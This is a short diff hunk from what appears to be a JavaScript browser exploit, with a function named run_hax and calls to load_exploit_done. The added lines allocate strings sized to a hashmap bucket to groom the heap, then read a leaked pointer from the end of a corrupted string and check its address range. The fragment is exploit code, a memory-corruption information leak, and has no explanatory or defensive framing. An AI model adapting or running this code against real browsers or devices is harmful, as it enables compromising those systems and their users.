@@ -678,6 +678,11 @@ function run_hax() {
     load_exploit_done(); 
     }
 }
+var HASHMAP_BUCKET = 208;
+var p_s = '';
+var needfix = [];
+var badstr2 = mkString(HASHMAP_BUCKET, p_s);
+needfix.push(mkString(HASHMAP_BUCKET, p_s));
 var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
 if (leak < 0x1000000000000)
 break;
